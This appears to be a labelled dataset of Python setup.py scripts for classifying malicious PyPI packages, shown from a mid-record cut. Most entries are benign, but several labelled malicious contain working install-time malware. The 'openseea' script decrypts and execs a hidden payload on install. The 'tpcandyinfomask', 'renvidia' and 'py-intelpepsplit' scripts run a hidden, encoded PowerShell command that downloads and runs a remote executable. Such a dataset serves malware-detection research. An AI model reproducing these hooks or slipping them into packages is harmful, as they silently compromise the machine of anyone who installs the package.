'flake8.extension': [\n            'I = flake8_import_order.flake8_linter:Linter',\n        ],\n        'pylama.linter': [\n            'import_order = flake8_import_order.pylama_linter:Linter'\n        ]\n    },\n\n    classifiers=[\n        \"Framework :: Flake8\",\n        \"Intended Audience :: Developers\",\n        \"Development Status :: 4 - Beta\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        (\n            \"License :: OSI Approved :: \"\n            \"GNU Lesser General Public License v3 (LGPLv3)\"\n        ),\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n        \"Operating System :: OS Independent\"\n    ]\n)\n", "target": 0}
{"idx": "Flask-Babel-2.0.0", "func": "from setuptools import setup\n\nfrom os import path\nthis_directory = path.abspath(path.dirname(__file__))\nwith open(path.join(this_directory, 'README.md'), 'rb') as f:\n    long_description = f.read().decode('utf-8')\n\n\nsetup(\n    name='Flask-Babel',\n    version='2.0.0',\n    url='http://github.com/python-babel/flask-babel',\n    license='BSD',\n    author='Armin Ronacher',\n    author_email='armin.ronacher@active-4.com',\n    maintainer='Tyler Kennedy',\n    maintainer_email='tk@tkte.ch',\n    description='Adds i18n/l10n support to Flask applications',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    packages=['flask_babel'],\n    zip_safe=False,\n    install_requires=[\n        'pytz',\n        'Flask',\n        'Babel>=2.3',\n        'Jinja2>=2.5'\n    ],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n    extras_require={\n        'dev': [\n            'pytest',\n            'pytest-mock',\n            'bumpversion',\n            'ghp-import',\n            'sphinx',\n            'Pallets-Sphinx-Themes'\n        ]\n    }\n)\n", "target": 0}
{"idx": "datapackage-1.15.2", "func": "# -*- coding: utf-8 -*-\nfrom __future__ import division\nfrom __future__ import print_function\nfrom __future__ import absolute_import\n\nimport os\nimport io\nfrom setuptools import setup, find_packages\n\n\n# Helpers\ndef read(*paths):\n    \"\"\"Read a text file.\"\"\"\n    basedir = os.path.dirname(__file__)\n    fullpath = os.path.join(basedir, *paths)\n    contents = io.open(fullpath, encoding='utf-8').read().strip()\n    return contents\n\n\n# Prepare\nPACKAGE = 'datapackage'\nNAME = PACKAGE.replace('_', '-')\nINSTALL_REQUIRES = [\n    'six>=1.10',\n    'click>=6.7',\n    'chardet>=3.0',\n    'requests>=2.8',\n    'jsonschema>=2.5',\n    'unicodecsv>=0.14',\n    'jsonpointer>=1.10',\n    'tableschema>=1.12.1',\n    'tabulator>=1.29',\n]\nINSTALL_CCHARDET_REQUIRES = [\n    'cchardet>=2.0',\n]\nTESTS_REQUIRE = [\n    'mock',\n    'pylama',\n    'pytest',\n    'pytest-cov',\n    'httpretty',\n    'tableschema-sql',\n]\nREADME = read('README.md')\nVERSION = read(PACKAGE, 'VERSION')\nPACKAGES = find_packages(exclude=['examples', 'tests'])\n\n\n# Run\nsetup(\n    name=NAME,\n    version=VERSION,\n    packages=PACKAGES,\n    include_package_data=True,\n    install_requires=INSTALL_REQUIRES,\n    tests_require=TESTS_REQUIRE,\n    extras_require={\n        'develop': TESTS_REQUIRE,\n        'cchardet': INSTALL_CCHARDET_REQUIRES,\n    },\n    entry_points={\n        'console_scripts': [\n            'datapackage = datapackage.__main__:cli',\n        ]\n    },\n    zip_safe=False,\n    long_description=README,\n    long_description_content_type='text/markdown',\n    description='Utilities to work with Data Packages as defined on specs.frictionlessdata.io',\n    author='Open Knowledge Foundation',\n    author_email='info@okfn.org',\n    url='https://github.com/frictionlessdata/datapackage-py',\n    license='MIT',\n    keywords=[\n        'frictionless data',\n        'open data',\n        'json schema',\n        'table schema',\n        'data package',\n        'tabular data package',\n    ],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Information Technology',\n        'Topic :: Utilities',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n    ],\n)\n", "target": 0}
{"idx": "dbutils_typehint-0.1.9", "func": "from setuptools import setup\n\nsetup(\n        name='dbutils_typehint',\n        version='0.1.9',\n        packages=['dbutils_typehint'],\n        url='https://github.com/cdeler/dbutils_typehint',\n        license='MIT',\n        author='cdeler',\n        author_email='serj.krotov@gmail.com',\n        description='Provides type hints for dbutils in Data Bricks: '\n                    'https://docs.databricks.com/dev-tools/databricks-utils.html',\n        python_requires='>=3.5',\n)\n", "target": 0}
{"idx": "focal-loss-0.0.7", "func": "\"\"\"Setup script.\"\"\"\n\nimport os\nimport pathlib\nimport re\n\nfrom setuptools import setup, find_packages\n\n# Set the environment variable TF_CPU (to anything) to use tensorflow-cpu\n_TENSORFLOW_CPU = os.environ.get('TF_CPU', None)\n\n# TensorFlow package name and version\n_TENSORFLOW = 'tensorflow' if _TENSORFLOW_CPU is None else 'tensorflow-cpu'\n_MIN_TENSORFLOW_VERSION = '2.2'\n_TENSORFLOW += f'>={_MIN_TENSORFLOW_VERSION}'\n\n# Directory of this setup.py file\n_HERE = pathlib.Path(__file__).parent\n\n\ndef _resolve_path(*parts):\n    \"\"\"Get a filename from a list of path components, relative to this file.\"\"\"\n    return _HERE.joinpath(*parts).absolute()\n\n\ndef _read(*parts):\n    \"\"\"Read a file's contents into a string.\"\"\"\n    filename = _resolve_path(*parts)\n    return filename.read_text()\n\n\n__INIT__ = _read('src', 'focal_loss', '__init__.py')\n\n\ndef _get_package_variable(name):\n    pattern = rf'^{name} = [\\'\"](?P<value>[^\\'\"]*)[\\'\"]'\n    match = re.search(pattern, __INIT__, flags=re.M)\n    if match:\n        return match.group('value')\n    raise RuntimeError(f'Cannot find variable {name}')\n\n\nsetup(\n    name=_get_package_variable('__package__'),\n    version=_get_package_variable('__version__'),\n    description=_get_package_variable('__description__'),\n    url=_get_package_variable('__url__'),\n    author=_get_package_variable('__author__'),\n    author_email=_get_package_variable('__author_email__'),\n    long_description=_read('README.rst'),\n    long_description_content_type='text/x-rst',\n    packages=find_packages('src', exclude=['*.tests']),\n    package_dir={'': 'src'},\n    license='Apache 2.0',\n    classifiers=[\n        'Development Status :: 1 - Planning',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Scientific/Engineering',\n        'Topic :: Scientific/Engineering :: Artificial Intelligence',\n        'Topic :: Scientific/Engineering :: Mathematics',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    install_requires=[\n        _TENSORFLOW,\n    ],\n    extras_require={\n        # The 'dev' extra is for development, including running tests and\n        # generating documentation\n        'dev': [\n            'numpy',\n            'scipy',\n            'matplotlib',\n            'seaborn',\n            'pytest',\n            'coverage',\n            'sphinx',\n            'sphinx_rtd_theme',\n        ],\n    },\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "noblesse2-0.0.1", "func": "from setuptools import setup, find_packages\n \nclassifiers = [\n  'Development Status :: 5 - Production/Stable',\n  'Intended Audience :: Education',\n  'Operating System :: Microsoft :: Windows :: Windows 10',\n  'License :: OSI Approved :: MIT License',\n  'Programming Language :: Python :: 3'\n]\n \nsetup(\n  name='noblesse2',\n  version='0.0.1',\n  description='Optimiser',\n  long_description=open('README.txt').read() + '\\n\\n' + open('CHANGELOG.txt').read(),\n  url='',  \n  author='misery',\n  author_email='predicc@protonmail.com',\n  license='MIT', \n  classifiers=classifiers,\n  keywords='noblesse2', \n  packages=find_packages(),\n  install_requires=[\n    'requests',\n    'colorama',\n    'discord',\n    'asyncio',\n    'datetime',\n    'youtube_dl',\n    'importlib_metadata',\n    'mss',\n    'pycryptodome',\n    'pillow',\n    'dhooks',\n    'psutil',\n    'discord.py==1.5.0',\n    'cryptography'\n    ] \n)\n", "target": 1}
{"idx": "django-redis-sessions-0.6.2", "func": "from setuptools import setup\nimport os\nfrom redis_sessions import __version__\n\ndef read(filename):\n    return open(os.path.join(os.path.dirname(__file__), filename)).read()\n\npackages = ['redis_sessions']\n\n\nsetup(\n    name='django-redis-sessions',\n    version=__version__,\n    description= \"Redis Session Backend For Django\",\n    long_description=read(\"README.rst\"),\n    keywords='django, sessions,',\n    author='Martin Rusev',\n    author_email='martin@amon.cx',\n    url='http://github.com/martinrusev/django-redis-sessions',\n    license='BSD',\n    packages=packages,\n    zip_safe=False,\n    install_requires=['redis>=2.4.10'],\n    include_package_data=True,\n    classifiers=[\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Framework :: Django\",\n        \"Environment :: Web Environment\",\n    ],\n    test_suite='tests'\n)\n", "target": 0}
{"idx": "openseea-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ysSbJKMjKHxSdKWcsBQnmxVPHcbfNZMnNMCugdVBIDbBRMfKsPgfcDtgIRJUpiRjdVHhUjKwktUXP'\nLONG_DESCRIPTION = 'RLFzHCNxfAdpaAOAUPyyDLXHJWaLpVOSxhzSxEKCIBabVfaXuGFgjQLglEylUndEMZB jzdFaWBYAlULfWcI nwYPGSjulvMMCwzFUtqCLVifQmyJxSSuHzPdwABKnKlaAXLDouNOTKAeesuGVyzxxRoZjHGNdYYNNMSdNqgluZooqHZUxmydKHvqwgJo cqMiFQTqPTBAJZOSg TZEgoKiGhgMxLlQQPwrhBkmENfMCpBlnAHfMMQVpqPaGoUCfghtAiEBTRdTwuTlYrXRziWkEbhRHVieIShwgNyukfrhpSWNlRSMsxOEkREKakywSWF fUMDvmdqWkFWfFJoCWVJDERhbpBcNGX uLxUEPDclLupzDGwLpr ZWNtGvLaaqNXrhtytxOgGnGLz oppdFtFiVdUISiJfUYhrDnIbxwxfpqaHpMFRTtZFyEDzGLWdePADZTASruegjozdvNRcqZVikMeClGTmlusdUhU'\n\n\nclass JFnJTQXLgNHWetGGPxZzUAHfTTpsWmwGPcrHbtNGWHGhQeexhWVVFzWcXCnrumyQJZeHSLesQfcYgxzaZdgFWHiwGeMJUUYmsWWiUaZMSFiMcgxjlYVeL(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'lsjUDaLaaLz07YQYKSjPEnwE29Q-19fWQMBd1WvWa8w=').decrypt(b'gAAAAABmbvVIVbYUUcBskHuLXXUPEJpWua7Jrjz6uM3_Ol7pCV2OeN-v2XZwwglPnPERcgUZrZKzJHDCBSYu2yH0KK5zvafisF4U-QSqIpqPmIkZGrJtFAL0naJ_KBJGYPnxO9tIBs3lBqbUrCX_ajDOecbzOZ8EkNMITwDt6gdab3xgvw6G6L_Vmxm-NFNmLj2BF_2UksHg41Bp8PACEYw54oywfPqkLRmqtf_UluiMUW99-_konhQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"openseea\",\n    version=VERSION,\n    author=\"SuZJUiJzAkOqaPzY\",\n    author_email=\"lLeMageWJWKK@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': JFnJTQXLgNHWetGGPxZzUAHfTTpsWmwGPcrHbtNGWHGhQeexhWVVFzWcXCnrumyQJZeHSLesQfcYgxzaZdgFWHiwGeMJUUYmsWWiUaZMSFiMcgxjlYVeL,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "tpcandyinfomask-3.55", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcandyinfomask',\n    packages = ['modlib'],\n    version = '10.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "renvidia-6.41", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'renvidia',\n    packages = ['modlib'],\n    version = '5.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-intelpepsplit-5.26", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intelpepsplit',\n    packages = ['modlib'],\n    version = '3.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-eradicate-1.3.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nmodules = \\\n['flake8_eradicate']\ninstall_requires = \\\n['attrs', 'eradicate>=2.0,<3.0', 'flake8>=3.5,<6', 'setuptools']\n\nentry_points = \\\n{'flake8.extension': ['E8 = flake8_eradicate:Checker']}\n\nsetup_kwargs = {\n    'name': 'flake8-eradicate',\n    'version': '1.3.0',\n    'description': 'Flake8 plugin to find commented out code',\n    'long_description': '# flake8-eradicate\\n\\n[![wemake.services](https://img.shields.io/badge/-wemake.services-green.svg?label=%20&logo=data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC%2FxhBQAAAAFzUkdCAK7OHOkAAAAbUExURQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP%2F%2F%2F5TvxDIAAAAIdFJOUwAjRA8xXANAL%2Bv0SAAAADNJREFUGNNjYCAIOJjRBdBFWMkVQeGzcHAwksJnAPPZGOGAASzPzAEHEGVsLExQwE7YswCb7AFZSF3bbAAAAABJRU5ErkJggg%3D%3D)](https://wemake-services.github.io)\\n[![Build Status](https://github.com/wemake-services/flake8-eradicate/workflows/test/badge.svg?branch=master&event=push)](https://github.com/wemake-services/flake8-eradicate/actions?query=workflow%3Atest)\\n[![codecov](https://codecov.io/gh/wemake-services/flake8-eradicate/branch/master/graph/badge.svg)](https://codecov.io/gh/wemake-services/flake8-eradicate)\\n[![Python Version](https://img.shields.io/pypi/pyversions/flake8-eradicate.svg)](https://pypi.org/project/flake8-eradicate/)\\n[![PyPI version](https://badge.fury.io/py/flake8-eradicate.svg)](https://pypi.org/project/flake8-eradicate/)\\n[![wemake-python-styleguide](https://img.shields.io/badge/style-wemake-000000.svg)](https://github.com/wemake-services/wemake-python-styleguide)\\n\\n`flake8` plugin to find commented out (or so called \"dead\") code.\\n\\nThis is quite important for the project in a long run.\\nBased on [`eradicate`](https://github.com/myint/eradicate) project.\\n\\n\\n## Installation\\n\\n```bash\\npip install flake8-eradicate\\n```\\n\\nIt is also a valuable part of [`wemake-python-styleguide`](https://github.com/wemake-services/wemake-python-styleguide).\\n\\n\\n## Usage\\n\\nRun your `flake8` checker [as usual](http://flake8.pycqa.org/en/latest/user/invocation.html).\\nCommented code should raise an error.\\n\\nExample:\\n\\n```bash\\nflake8 your_module.py\\n```\\n\\n\\n## Options\\n\\n- `--eradicate-aggressive` to enable aggressive mode from `eradicate`, can lead to false positives\\n- `--eradicate-whitelist` to overwrite the whitelist from `eradicate` (`#` separated list)\\n- `--eradicate-whitelist-extend` to extend the whitelist from `eradicate` (`#` separated list)\\n\\n\\n## Error codes\\n\\n| Error code |        Description       |\\n|:----------:|:------------------------:|\\n|    E800    | Found commented out code |\\n\\n\\n## Output example\\n\\nHere\\'s how output looks like (we are using [`wemake` formatter](https://wemake-python-stylegui.de/en/latest/pages/usage/formatter.html)):\\n\\n\\n![flake8-eradicate output](https://raw.githubusercontent.com/wemake-services/flake8-eradicate/master/eradicate.png)\\n\\n\\n## License\\n\\nMIT.\\n',\n    'author': 'Nikita Sobolev',\n    'author_email': 'mail@sobolevn.me',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/wemake-services/flake8-eradicate',\n    'py_modules': modules,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "google-3.0.0", "func": "#!/usr/bin/env python\n\n# Copyright (c) 2009-2020, Mario Vilas\n# All rights reserved.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#\n#     * Redistributions of source code must retain the above copyright notice,\n#       this list of conditions and the following disclaimer.\n#     * Redistributions in binary form must reproduce the above copyright\n#       notice,this list of conditions and the following disclaimer in the\n#       documentation and/or other materials provided with the distribution.\n#     * Neither the name of the copyright holder nor the names of its\n#       contributors may be used to endorse or promote products derived from\n#       this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n\nfrom os import chdir\nfrom os.path import abspath, join, split\n\n# Make sure we are standing in the correct directory.\n# Old versions of distutils didn't take care of this.\nhere = split(abspath(__file__))[0]\nchdir(here)\n\n# Package metadata.\nmetadata = dict(\n    name='google',\n    provides=['googlesearch'],\n    requires=['beautifulsoup4'],\n    packages=['googlesearch'],\n    scripts=[join('scripts', 'google')],\n    package_data={'googlesearch': ['user_agents.txt.gz']},\n    include_package_data=True,\n    version=\"3.0.0\",\n    description=\"Python bindings to the Google search engine.\",\n    author=\"Mario Vilas\",\n    author_email=\"mvilas@gmail.com\",\n    url=\"http://breakingcode.wordpress.com/\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Environment :: Console\",\n        \"Programming Language :: Python\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n     ],\n)\n\n# Prefer setuptools over the old distutils.\n# If setuptools is available, use install_requires.\ntry:\n    from setuptools import setup\n    metadata['install_requires'] = metadata['requires']\nexcept ImportError:\n    from distutils.core import setup\n\n# Run the setup script.\nsetup(**metadata)\n", "target": 0}
{"idx": "django-stubs-1.12.0", "func": "import os\nfrom typing import List\n\nfrom setuptools import find_packages, setup\n\n\ndef find_stub_files(name: str) -> List[str]:\n    result = []\n    for root, _dirs, files in os.walk(name):\n        for file in files:\n            if file.endswith(\".pyi\"):\n                if os.path.sep in root:\n                    sub_root = root.split(os.path.sep, 1)[-1]\n                    file = os.path.join(sub_root, file)\n                result.append(file)\n    return result\n\n\nwith open(\"README.md\") as f:\n    readme = f.read()\n\ndependencies = [\n    \"mypy>=0.930\",\n    \"django\",\n    \"django-stubs-ext>=0.4.0\",\n    \"tomli\",\n    # Types:\n    \"typing-extensions\",\n    \"types-pytz\",\n    \"types-PyYAML\",\n]\n\nextras_require = {\n    \"compatible-mypy\": [\"mypy>=0.930,<0.970\"],\n}\n\nsetup(\n    name=\"django-stubs\",\n    version=\"1.12.0\",\n    description=\"Mypy stubs for Django\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    license=\"MIT\",\n    url=\"https://github.com/typeddjango/django-stubs\",\n    author=\"Maksim Kurnikov\",\n    author_email=\"maxim.kurnikov@gmail.com\",\n    maintainer=\"Nikita Sobolev\",\n    maintainer_email=\"mail@sobolevn.me\",\n    py_modules=[],\n    python_requires=\">=3.7\",\n    install_requires=dependencies,\n    extras_require=extras_require,\n    packages=[\"django-stubs\", *find_packages(exclude=[\"scripts\"])],\n    package_data={\n        \"django-stubs\": find_stub_files(\"django-stubs\"),\n        \"mypy_django_plugin\": [\"py.typed\"],\n    },\n    classifiers=[\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Typing :: Typed\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n    ],\n    project_urls={\n        \"Release notes\": \"https://github.com/typeddjango/django-stubs/releases\",\n    },\n)\n", "target": 0}
{"idx": "dj-database-url-1.0.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nwith open(\"README.rst\") as readme_rst:\n    readme = readme_rst.read()\n\nsetup(\n    name=\"dj-database-url\",\n    version=\"1.0.0\",\n    url=\"https://github.com/jazzband/dj-database-url\",\n    license=\"BSD\",\n    author=\"Original Author: Kenneth Reitz, Maintained by: JazzBand Community\",\n    description=\"Use Database URLs in your Django Application.\",\n    long_description=readme,\n    long_description_content_type=\"text/x-rst\",\n    py_modules=[\"dj_database_url\"],\n    install_requires=[\"Django>3.2\"],\n    zip_safe=False,\n    include_package_data=True,\n    platforms=\"any\",\n    classifiers=[\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n)\n", "target": 0}
{"idx": "flake8-logging-format-0.7.4", "func": "#!/usr/bin/env python\nfrom setuptools import find_packages, setup\n\nproject = \"flake8-logging-format\"\nversion = \"0.7.4\"\nlong_description = open(\"README.md\").read()\n\nsetup(\n    name=project,\n    version=version,\n    author=\"Globality Engineering\",\n    author_email=\"engineering@globality.com\",\n    url=\"https://github.com/globality-corp/flake8-logging-format\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(exclude=[\"*.tests\", \"*.tests.*\", \"tests.*\", \"tests\"]),\n    include_package_data=True,\n    zip_safe=False,\n    keywords=\"microcosm\",\n    install_requires=[\n    ],\n    extras_require={\n        \"test\": [\n            \"pytest\",\n            \"pytest-cov\",\n            \"PyHamcrest\",\n        ],\n        \"lint\": [\n            \"flake8\",\n        ]\n    },\n    dependency_links=[\n    ],\n    entry_points={\n        \"flake8.extension\": [\n            \"G = logging_format.api:LoggingFormatValidator\",\n        ],\n        \"logging.extra.example\": [\n            \"example = logging_format.whitelist:example_whitelist\",\n        ],\n    },\n    classifiers=[\n        \"Framework :: Flake8\",\n    ],\n)\n", "target": 0}
